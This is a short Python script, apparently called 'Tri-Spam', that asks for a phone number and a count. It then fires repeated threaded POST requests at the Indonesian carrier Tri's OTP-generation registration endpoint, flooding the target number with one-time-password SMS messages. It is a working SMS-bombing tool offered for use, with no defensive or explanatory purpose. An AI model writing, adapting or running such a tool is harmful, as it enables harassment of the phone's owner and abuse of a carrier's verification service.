from multiprocessing.pool import ThreadPool
try:
	import os, time, requests, sys
except ModuleNotFoundError:
	print("\nPlease Install Module Requests Example Below")
	print("$ pip install requests\n")
	exit()
os.system('clear')
print("""\033[1;35m


		•>──────────────────<•
		┌┬┐┬─┐┬   ┌─┐┌─┐┌─┐┌┬┐\033[1;32m
		 │ ├┬┘│ ─ └─┐├─┘├─┤│││\033[1;35m
		 ┴ ┴└─┴   └─┘┴  ┴ ┴┴ ┴\033[1;32m
		      \033[1;32m«\033[1;35m K I W Z\033[1;32m »


""")
no = input(" <• Number =>\033[1;35m ")
tot = int(input("\033[1;32m <• Amount =>\033[1;35m "))
spam = {'msisdn':no}
idk = '200'
def main(arg):
	try:
		r = requests.post('https://registrasi.tri.co.id/daftar/generateOTP?',data = spam)
#		print(r.text)
		if str(idk) in str(r.text):
			print("\033[1;32m [✓] Sending Success")
		else:
			print("\033[1;31m [×] Sending Failed")
	except: pass

jobs = []
for x in range(tot):
    jobs.append(x)
p=ThreadPool(10)
p.map(main,jobs)
